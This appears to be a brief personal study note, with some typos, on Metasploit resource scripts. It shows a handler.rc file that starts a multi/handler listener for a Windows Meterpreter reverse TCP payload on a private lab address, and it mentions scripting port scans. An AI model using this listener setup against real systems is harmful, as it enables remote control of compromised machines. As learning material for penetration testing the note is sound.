

- rc scripts will make for example tasks like listener faster 
- la -al ~usr/share/etaspliot framework/script/respurce/
- vim handler.rc
```
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.5
set LPORT 1234
run
```
- msfconsole -r handler.rc (it will execute the script which holds our commands)
- we can make another script to run tcp scan on ports
- 